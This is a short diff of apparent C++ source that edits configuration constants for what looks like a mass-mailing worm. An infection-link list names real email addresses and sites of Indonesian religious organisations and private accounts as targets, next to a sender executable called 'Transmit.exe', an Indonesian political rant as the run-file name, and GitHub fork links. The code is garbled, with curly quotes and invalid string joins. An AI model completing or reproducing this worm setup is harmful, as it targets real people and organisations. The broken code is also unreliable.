@@ -20,7 +20,7 @@ using namespace std;
 #define FOLDER_NAME “Terms LAW policy”
 #define RUN_FILE_NAME “Jangan biarkan korupsi membludak tetap kerjakan sebagaimana dunia isinya ujian untuk dimenangkan hal yang bijak, serahkan kepada yang kuasa ada yang dikembalikan nantinya dengan Qs.SAAF.|||| MBG dihapuskan merahputih dikedepankan , presiden tuh bijak gak lembek , gebragan doang gak ada praktik punya banyak saham tanah dikalimantan hektaran pakai pola konsep salam parung angkot 06 merdeka w1ry4" 
 #define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/cy11/forks"."https://github.com/FadliwiryaWirawan110993/"
-#define INFECT_Link_NAME "https"."https://workspace.google.com/intl/id/usahasertifikasilestari@gmail.com"."https://workspace.google.com/intl/id/sutajayanisa@gmail.com"."https://workspace.google.com/intl/id/lphkht@muhammadiyah.id"."https://workspace.google.com/intl/id/redaksi@nu.or.id"."https://nu.or.id/page/kontak-kami"."https://muhammadiyah.or.id"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/id/pp@muhammadiyah.id"."https://workspace.google.com/intl/id/usahasertifikasilestari@gmail.com"."https://workspace.google.com/intl/id/sutajayanisa@gmail.com"."https://workspace.google.com/intl/id/lphkht@muhammadiyah.id"."https://workspace.google.com/intl/id/redaksi@nu.or.id"."https://nu.or.id/page/kontak-kami"."https://muhammadiyah.or.id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
